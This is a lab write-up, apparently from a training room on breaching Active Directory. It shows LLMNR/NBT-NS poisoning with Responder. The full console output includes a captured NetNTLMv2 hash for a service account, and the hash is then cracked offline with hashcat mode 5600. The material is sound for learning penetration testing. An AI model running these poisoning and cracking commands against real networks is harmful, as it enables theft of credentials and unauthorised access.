## Poisoning with responder
- We can intercept the authentication request sent by workstations to the server.
- It is done in the following steps.

1. The request is sent by a workstation, to the user which is intercepted by an attacker, by poisoning the request.
2. This request is forwarded to the server for challenge by the attacker.
3. Server responds with a NTLM challenge.
4. Attacker forwards this challenge to the workstation.
5. Workstation sends solved challenge with encrypted hash. 
6. Attacker forwards challenge to the server.
7. Server grants access.
8. Attacker sends access denied to the workstation.
9. Attacker has access to NTLM hash

- In this example started the responder server for intercepting a request and got NTLM hash.

```console
❯ sudo responder -I breachad
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [breachad]
    Responder IP               [10.50.22.10]
    Responder IPv6             [fe80::1b60:3513:1835:8f3c]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-30GSD1PZ3VJ]
    Responder Domain Name      [3ES2.LOCAL]
    Responder DCE-RPC Port     [49365]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.200.24.202
[SMB] NTLMv2-SSP Username : ZA\svcFileCopy
[SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:46a31832ca17cbdd:C2FB610F6C3E1AC0E75088CCCB59EA39:010100000000000080E53ADE5CF4D801F3801701A4E7EA970000000002000800330045005300320001001E00570049004E002D0033003000470053004400310050005A00330056004A0004003400570049004E002D0033003000470053004400310050005A00330056004A002E0033004500530032002E004C004F00430041004C000300140033004500530032002E004C004F00430041004C000500140033004500530032002E004C004F00430041004C000700080080E53ADE5CF4D80106000400020000000800300030000000000000000000000000200000930CE5C1570B2EEADB6A1A3C0B699BA3AA1A55A16A08D538C80DEB68623B4D5E0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00320032002E00310030000000000000000000
[+] Exiting...
```
- Saved this hash to  a file.

```console
❯ echo "svcFileCopy::ZA:46a31832ca17cbdd:C2FB610F6C3E1AC0E75088CCCB59EA39:010100000000000080E53ADE5CF4D801F3801701A4E7EA970000000002000800330045005300320001001E00570049004E002D0033003000470053004400310050005A00330056004A0004003400570049004E002D0033003000470053004400310050005A00330056004A002E0033004500530032002E004C004F00430041004C000300140033004500530032002E004C004F00430041004C000500140033004500530032002E004C004F00430041004C000700080080E53ADE5CF4D80106000400020000000800300030000000000000000000000000200000930CE5C1570B2EEADB6A1A3C0B699BA3AA1A55A16A08D538C80DEB68623B4D5E0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00320032002E00310030000000000000000000" > hash
```

- Cracked this hash with hashcat and passwordlist.txt provided by the room author.

```console
❯ hashcat -m 5600 hash passwordlist.txt --force  -o hashcat_output
hashcat (v6.2.5) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-AMD Ryzen 3 3250U with Radeon Graphics, 993/2050 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: passwordlist.txt
* Passwords.: 513
* Bytes.....: 4010
* Keyspace..: 513
* Runtime...: 0 secs


Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SVCFILECOPY::ZA:46a31832ca17cbdd:c2fb610f6c3e1ac0e7...000000
Time.Started.....: Wed Nov  9 17:37:36 2022, (0 secs)
Time.Estimated...: Wed Nov  9 17:37:36 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   250.5 kH/s (0.77ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 512/513 (99.81%)
Rejected.........: 0/512 (0.00%)
Restore.Point....: 0/513 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> letmein
Hardware.Mon.#1..: Util: 46%

Started: Wed Nov  9 17:37:35 2022
Stopped: Wed Nov  9 17:37:38 2022
```

